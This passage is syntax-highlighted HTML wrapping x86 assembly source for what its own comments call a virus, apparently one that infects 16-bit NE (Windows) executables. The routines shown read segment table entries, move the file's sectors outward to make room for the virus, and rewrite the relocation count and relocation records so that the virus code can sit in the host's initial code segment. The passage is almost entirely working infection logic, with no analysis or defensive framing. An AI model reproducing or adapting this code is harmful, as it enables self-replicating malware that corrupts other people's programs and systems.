        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">TEMP</span><span class="sc0">          </span><span class="sc1">;read into TEMP buffer</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FILE_WRITE</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;This routine goes to the segment table entry number specified in dx in the</span><span class="sc0">
</span><span class="sc1">;file and reads it into the TEMP buffer. dx=1 is the first entry!</span><span class="sc0">
</span><span class="sc5">GET_SEG_ENTRY</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc5">NH_OFFSET</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">NEW_HDR</span><span class="sc4">+</span><span class="sc2">22H</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;dx=ofs of seg table entry requested</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                   </span><span class="sc1">;in the file</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FILE_SEEK_ST</span><span class="sc0">            </span><span class="sc1">;go to specified table entry</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc9">SHORT</span><span class="sc0"> </span><span class="sc5">GSE1</span><span class="sc0">              </span><span class="sc1">;exit on error</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">TEMP</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FILE_READ</span><span class="sc0">               </span><span class="sc1">;read table entry into disk buf</span><span class="sc0">
</span><span class="sc5">GSE1</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;This routine moves the end of the virus out by VIRSECS. The "end" is</span><span class="sc0">
</span><span class="sc1">;everything after the initial code segment where the virus will live.</span><span class="sc0">
</span><span class="sc1">;The variable VIRSECS is assumed to be properly set up before this is called.</span><span class="sc0">
</span><span class="sc5">MOVE_END_OUT</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc5">CS_SIZE</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;size of cs in bytes, before infect</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,[</span><span class="sc5">LOG_SEC</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc9">SHORT</span><span class="sc0"> </span><span class="sc5">ME01</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">ME01</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc5">INITSEC</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;ax=next sector after cs</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">;save it</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                    </span><span class="sc1">;seek end of file</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FILE_SEEK</span><span class="sc0">               </span><span class="sc1">;returns dx:ax = file size</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,[</span><span class="sc5">LOG_SEC</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">                      </span><span class="sc1">;ax=sectors in file</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">ME015</span><span class="sc0">                   </span><span class="sc1">;adjust for extra bytes</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">ME015</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">;keep it here</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">                      </span><span class="sc1">;di=lowest sector to move</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">                   </span><span class="sc1">;dx=number of sectors to move</span><span class="sc0">

</span><span class="sc5">MEO2</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MOVE_SECTORS</span><span class="sc0">            </span><span class="sc1">;move as much as data buffer allows</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">                      </span><span class="sc1">;number moved returned in ax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">MEO2</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;This routine moves as many sectors as buffer will permit, up to the number</span><span class="sc0">
</span><span class="sc1">;requested. On entry, dx=maximum number of sectors to move, and di=lowest</span><span class="sc0">
</span><span class="sc1">;sector number to move. This routine works from the end of the file, so if</span><span class="sc0">
</span><span class="sc1">;X is the number of sectors to be moved, it will move all the sectors from</span><span class="sc0">
</span><span class="sc1">;di+dx-X to di+dx-1. All sectors are move out by [VIRSECS].</span><span class="sc0">
</span><span class="sc5">MOVE_SECTORS</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">                      </span><span class="sc1">;first determine # of secs to move</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">DATABUF_SIZE</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,[</span><span class="sc5">LOG_SEC</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">                      </span><span class="sc1">;ax=data buf size in logical sectors</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                   </span><span class="sc1">;is ax&gt;dx? (max sectors to move)</span><span class="sc0">
        </span><span class="sc6">jle</span><span class="sc0">     </span><span class="sc9">SHORT</span><span class="sc0"> </span><span class="sc5">MS1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                   </span><span class="sc1">;ax=# secs to move now</span><span class="sc0">
</span><span class="sc5">MS1</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">;save it till end</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">;di=1st sector to move</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,[</span><span class="sc5">LOG_SEC</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">                      </span><span class="sc1">;ax=bytes to move this time</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">;save it on stack</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,[</span><span class="sc5">LOG_SEC</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FILE_SEEK_ST</span><span class="sc0">            </span><span class="sc1">;seek starting sector to move</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">                      </span><span class="sc1">;cx=bytes to read</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">TEMP</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FILE_READ</span><span class="sc0">               </span><span class="sc1">;and read it</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">;save actual number of bytes read</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc5">VIRSECS</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;ax=location to move to, in secs</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,[</span><span class="sc5">LOG_SEC</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">                      </span><span class="sc1">;dx:ax=loc to move to, in bytes</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                   </span><span class="sc1">;set up seek function</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FILE_SEEK_ST</span><span class="sc0">            </span><span class="sc1">;and move there</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">                      </span><span class="sc1">;bytes to write</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">TEMP</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FILE_WRITE</span><span class="sc0">              </span><span class="sc1">;and write proper number of bytes there</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">;report sectors moved this time</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;This routine sets the variable RELOCS and CS_SIZE variables in memory from the</span><span class="sc0">
</span><span class="sc1">;uninfected file. Then it updates the relocs counter in the file to add the</span><span class="sc0">
</span><span class="sc1">;number of relocatables required by the virus.</span><span class="sc0">
</span><span class="sc5">SET_RELOCS</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">RELOCS</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">NEW_HDR</span><span class="sc4">+</span><span class="sc2">16H</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;read init cs seg table entry</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GET_SEG_ENTRY</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">TEMP</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;get segment flags</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                    </span><span class="sc1">;check for relocation data</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">NEW_HDR</span><span class="sc4">+</span><span class="sc2">14H</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;size of segment w/o virus is this now</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc9">SHORT</span><span class="sc0"> </span><span class="sc5">SRE</span><span class="sc0">               </span><span class="sc1">;no data, continue</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">;there is relocation data, how much?</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc5">INITSEC</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;find end of code in file</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,[</span><span class="sc5">LOG_SEC</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">                      </span><span class="sc1">;dx:ax = start of cs in file</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">                      </span><span class="sc1">;cx = size of code</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">adc</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">;cx:dx = end of cs in file</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FILE_SEEK_ST</span><span class="sc0">            </span><span class="sc1">;so go seek it</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">RELOCS</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FILE_READ</span><span class="sc0">               </span><span class="sc1">;read 2 byte count of relocatables</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FILE_SEEK_ST</span><span class="sc0">            </span><span class="sc1">;go back to that location</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc5">RELOCS</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc5">VSTART</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">ARELOCS</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">RELOCS</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">RELOCS</span><span class="sc0">        </span><span class="sc1">;and update relocs in the file</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FILE_WRITE</span><span class="sc0">              </span><span class="sc1">;adding arelocs to it</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">RELOCS</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc5">RELOCS</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                    </span><span class="sc1">;size of relocation data</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">                      </span><span class="sc1">;size of code in segment</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                   </span><span class="sc1">;total size of segment</span><span class="sc0">
        </span><span class="sc6">adc</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">SRE</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">CS_SIZE</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">            </span><span class="sc1">;save it here</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;This routine relocates the relocatables at the end of the initial code</span><span class="sc0">
</span><span class="sc1">;segment to make room for the virus. It will move any number of relocation</span><span class="sc0">
</span><span class="sc1">;records, each of which is 8 bytes long. It also adds the new relocatables</span><span class="sc0">
</span><span class="sc1">;for the virus to the file.</span><span class="sc0">
</span><span class="sc5">RELOCATE_RELOCS</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc5">RELOCS</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;number of relocatables</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                    </span><span class="sc1">;ax=total number of bytes to move</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc5">INITSEC</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,[</span><span class="sc5">LOG_SEC</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">                      </span><span class="sc1">;dx:ax = start of cs in file</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">NEW_HDR</span><span class="sc4">+</span><span class="sc2">14H</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">adc</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                    </span><span class="sc1">;dx:ax = end of cs in file</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">                      </span><span class="sc1">;cx = size of relocatables</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">adc</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                    </span><span class="sc1">;dx:ax = end of code+relocatables</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                   </span><span class="sc1">;ax=size cx:dx=location</span><span class="sc0">

</span><span class="sc5">RR_LP</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">DATABUF_SIZE</span><span class="sc0">
        </span><span class="sc6">jle</span><span class="sc0">     </span><span class="sc9">SHORT</span><span class="sc0"> </span><span class="sc5">RR1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">DATABUF_SIZE</span><span class="sc0">         </span><span class="sc1">;read up to DATABUF_SIZE bytes</span><span class="sc0">
</span><span class="sc5">RR1</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">;back up file pointer</span><span class="sc0">
        </span><span class="sc6">sbb</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FILE_SEEK_ST</span><span class="sc0">            </span><span class="sc1">;seek desired location in file</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">TEMP</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FILE_READ</span><span class="sc0">               </span><span class="sc1">;read needed number of bytes, # in ax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">;save # of bytes read</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">VIRUS_SIZE</span><span class="sc0">           </span><span class="sc1">;move file pointer up now</span><span class="sc0">
        </span><span class="sc6">adc</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FILE_SEEK_ST</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">                      </span><span class="sc1">;bytes to write</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">TEMP</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FILE_WRITE</span><span class="sc0">              </span><span class="sc1">;write them to new location</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">DATABUF_SIZE</span><span class="sc0">         </span><span class="sc1">;less than DATABUF_SIZE bytes to write?</span><span class="sc0">
        </span><span class="sc6">jle</span><span class="sc0">     </span><span class="sc9">SHORT</span><span class="sc0"> </span><span class="sc5">RRE</span><span class="sc0">               </span><span class="sc1">;yes, we're all done</span><span class="sc0">
